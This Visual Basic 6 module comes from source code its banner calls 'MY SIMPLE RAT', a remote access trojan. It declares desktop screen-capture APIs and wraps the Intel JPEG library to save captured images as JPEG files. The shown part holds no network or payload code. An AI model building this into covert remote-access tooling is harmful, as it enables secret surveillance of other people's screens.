Attribute VB_Name = "mJPG"
'#########################################'
'#########################################'
'##                                     ##'
'##          MY SIMPLE RAT :)           ##'
'##                                     ##'
'##             28.11.2004              ##'
'##                                     ##'
'##   ~ RIPPING SUCKX ~                 ##'
'##                                     ##'
'##       -> SNIPER109 <-               ##'
'##                                     ##'
'## irc.quakenet.org @ #sniper109       ##'
'#########################################'
'#########################################'

Option Explicit
    Public Type tRect
        x As Long
        y As Long
        X2 As Long
        Y2 As Long
    End Type
    Public Declare Function GetDesktopWindow Lib "user32" () As Long
    Public Declare Function GetWindowDC Lib "user32" (ByVal hWnd As Long) As Long
    Public Declare Function GetWindowRect Lib "user32" (ByVal hWnd As Long, lpRect As tRect) As Long
    Public Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
    Public Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal XSrc As Long, ByVal YSrc As Long, ByVal dwRop As Long) As Long
    Global Path As String
    Global JPG As New cDIBSection
'Consts
    Public Const GMEM_DDESHARE = &H2000
    Public Const GMEM_DISCARDABLE = &H100
    Public Const GMEM_DISCARDED = &H4000
    Public Const GMEM_FIXED = &H0
    Public Const GMEM_INVALID_HANDLE = &H8000
    Public Const GMEM_LOCKCOUNT = &HFF
    Public Const GMEM_MODIFY = &H80
    Public Const GMEM_MOVEABLE = &H2
    Public Const GMEM_NOCOMPACT = &H10
    Public Const GMEM_NODISCARD = &H20
    Public Const GMEM_NOT_BANKED = &H1000
    Public Const GMEM_NOTIFY = &H4000
    Public Const GMEM_SHARE = &H2000
    Public Const GMEM_VALID_FLAGS = &H7F72
    Public Const GMEM_ZEROINIT = &H40
    Public Const GPTR = (GMEM_FIXED Or GMEM_ZEROINIT)
    
'Enums
    Private Enum IJLERR
        '// The following "error" values indicate an "OK" condition.
        IJL_OK = 0
        IJL_INTERRUPT_OK = 1
        IJL_ROI_OK = 2
        
        '// The following "error" values indicate an error has occurred.
        IJL_EXCEPTION_DETECTED = -1
        IJL_INVALID_ENCODER = -2
        IJL_UNSUPPORTED_SUBSAMPLING = -3
        IJL_UNSUPPORTED_BYTES_PER_PIXEL = -4
        IJL_MEMORY_ERROR = -5
        IJL_BAD_HUFFMAN_TABLE = -6
        IJL_BAD_QUANT_TABLE = -7
        IJL_INVALID_JPEG_PROPERTIES = -8
        IJL_ERR_FILECLOSE = -9
        IJL_INVALID_FILENAME = -10
        IJL_ERROR_EOF = -11
        IJL_PROG_NOT_SUPPORTED = -12
        IJL_ERR_NOT_JPEG = -13
        IJL_ERR_COMP = -14
        IJL_ERR_SOF = -15
        IJL_ERR_DNL = -16
        IJL_ERR_NO_HUF = -17
        IJL_ERR_NO_QUAN = -18
        IJL_ERR_NO_FRAME = -19
        IJL_ERR_MULT_FRAME = -20
        IJL_ERR_DATA = -21
        IJL_ERR_NO_IMAGE = -22
        IJL_FILE_ERROR = -23
        IJL_INTERNAL_ERROR = -24
        IJL_BAD_RST_MARKER = -25
        IJL_THUMBNAIL_DIB_TOO_SMALL = -26
        IJL_THUMBNAIL_DIB_WRONG_COLOR = -27
        IJL_RESERVED = -99
    End Enum
    
    Private Enum IJLIOTYPE
        IJL_SETUP = -1&
        ''// Read JPEG parameters (i.e., height, width, channels,
        ''// sampling, etc.) from a JPEG bit stream.
        IJL_JFILE_READPARAMS = 0&
        IJL_JBUFF_READPARAMS = 1&
        ''// Read a JPEG Interchange Format image.
        IJL_JFILE_READWHOLEIMAGE = 2&
        IJL_JBUFF_READWHOLEIMAGE = 3&
        ''// Read JPEG tables from a JPEG Abbreviated Format bit stream.
        IJL_JFILE_READHEADER = 4&
        IJL_JBUFF_READHEADER = 5&
        ''// Read image info from a JPEG Abbreviated Format bit stream.
        IJL_JFILE_READENTROPY = 6&
        IJL_JBUFF_READENTROPY = 7&
        ''// Write an entire JFIF bit stream.
        IJL_JFILE_WRITEWHOLEIMAGE = 8&
        IJL_JBUFF_WRITEWHOLEIMAGE = 9&
        ''// Write a JPEG Abbreviated Format bit stream.
        IJL_JFILE_WRITEHEADER = 10&
        IJL_JBUFF_WRITEHEADER = 11&
        ''// Write image info to a JPEG Abbreviated Format bit stream.
        IJL_JFILE_WRITEENTROPY = 12&
        IJL_JBUFF_WRITEENTROPY = 13&
        ''// Scaled Decoding Options:
        ''// Reads a JPEG image scaled to 1/2 size.
        IJL_JFILE_READONEHALF = 14&
        IJL_JBUFF_READONEHALF = 15&
        ''// Reads a JPEG image scaled to 1/4 size.
        IJL_JFILE_READONEQUARTER = 16&
        IJL_JBUFF_READONEQUARTER = 17&
        ''// Reads a JPEG image scaled to 1/8 size.
        IJL_JFILE_READONEEIGHTH = 18&
        IJL_JBUFF_READONEEIGHTH = 19&
        ''// Reads an embedded thumbnail from a JFIF bit stream.
        IJL_JFILE_READTHUMBNAIL = 20&
        IJL_JBUFF_READTHUMBNAIL = 21&
    End Enum
    
    Private Type JPEG_CORE_PROPERTIES_VB
      UseJPEGPROPERTIES As Long                      '// default = 0
    
      '// DIB specific I/O data specifiers.
      DIBBytes As Long ';                  '// default = NULL 4
      DIBWidth As Long ';                  '// default = 0 8
      DIBHeight As Long ';                 '// default = 0 12
      DIBPadBytes As Long ';               '// default = 0 16
      DIBChannels As Long ';               '// default = 3 20
      DIBColor As Long ';                  '// default = IJL_BGR 24
      DIBSubsampling As Long  ';            '// default = IJL_NONE 28
    
      '// JPEG specific I/O data specifiers.
      JPGFile As Long 'LPTSTR              JPGFile;                32   '// default = NULL
      JPGBytes As Long ';                  '// default = NULL 36
      JPGSizeBytes As Long ';              '// default = 0 40
      JPGWidth As Long ';                  '// default = 0 44
      JPGHeight As Long ';                 '// default = 0 48
      JPGChannels As Long ';               '// default = 3
      JPGColor As Long           ';                  '// default = IJL_YCBCR
      JPGSubsampling As Long  ';            '// default = IJL_411
      JPGThumbWidth As Long ' ;             '// default = 0
      JPGThumbHeight As Long ';            '// default = 0
    
      '// JPEG conversion properties.
      cconversion_reqd As Long ';          '// default = TRUE
      upsampling_reqd As Long ';           '// default = TRUE
      jquality As Long ';                  '// default = 75.  100 is my preferred quality setting.
    
      '// Low-level properties - 20,000 bytes.  If the whole structure
      ' is written out then VB fails with an obscure error message
      ' "Too Many Local Variables" !
      ' These all default if they are not otherwise specified so there
      ' is no trouble.
      jprops(0 To 19999) As Byte
    End Type

'API
    Private Declare Function ijlInit Lib "ijl10.dll" (jcprops As Any) As Long
    Private Declare Function ijlFree Lib "ijl10.dll" (jcprops As Any) As Long
    Private Declare Function ijlRead Lib "ijl10.dll" (jcprops As Any, ByVal ioType As Long) As Long
    Private Declare Function ijlWrite Lib "ijl10.dll" (jcprops As Any, ByVal ioType As Long) As Long
    Private Declare Function ijlGetLibVersion Lib "ijl10.dll" () As Long
    Private Declare Function ijlGetErrorString Lib "ijl10.dll" (ByVal code As Long) As Long
    
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (lpvDest As Any, lpvSource As Any, ByVal cbCopy As Long)
    Private Declare Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
    Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
    Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
    Private Declare Function GlobalUnlock Lib "kernel32" (ByVal hMem As Long) As Long
        
Public Function SaveJPG(ByRef cDIB As cDIBSection, ByVal sFile As String, ByVal lQuality As Long) As Boolean
    Dim tJ As JPEG_CORE_PROPERTIES_VB
    Dim bFile() As Byte
    Dim lPtr As Long
    Dim lR As Long
   
   lR = ijlInit(tJ)
   If lR = IJL_OK Then
      ' Set up the DIB information:
      ' Store DIBWidth:
      tJ.DIBWidth = cDIB.Width
      ' Store DIBHeight:
      tJ.DIBHeight = -cDIB.Height
      ' Store DIBBytes (pointer to uncompressed JPG data):
      tJ.DIBBytes = cDIB.DIBSectionBitsPtr
      ' Very important: tell IJL how many bytes extra there
      ' are on each DIB scan line to pad to 32 bit boundaries:
      tJ.DIBPadBytes = cDIB.BytesPerScanLine - cDIB.Width * 3

      ' Store JPGFile:
      bFile = StrConv(sFile, vbFromUnicode)
      ReDim Preserve bFile(0 To UBound(bFile) + 1) As Byte
      bFile(UBound(bFile)) = 0
      lPtr = VarPtr(bFile(0))
      CopyMemory tJ.JPGFile, lPtr, 4
      ' Store JPGWidth:
      tJ.JPGWidth = cDIB.Width
      ' .. & JPGHeight member values:
      tJ.JPGHeight = cDIB.Height
      ' Set the quality/compression to save:
      tJ.jquality = lQuality
            
      ' Write the image:
      lR = ijlWrite(tJ, IJL_JFILE_WRITEWHOLEIMAGE)
      If lR = IJL_OK Then
         SaveJPG = True
        Else
         'msgbox "Error saving JPG", vbCritical, "Error"
      End If
      
      ' Ensure we have freed memory:
      ijlFree tJ
      
    Else
         'msgbox "Error saving JPG", vbCritical, "Error"
   End If
End Function

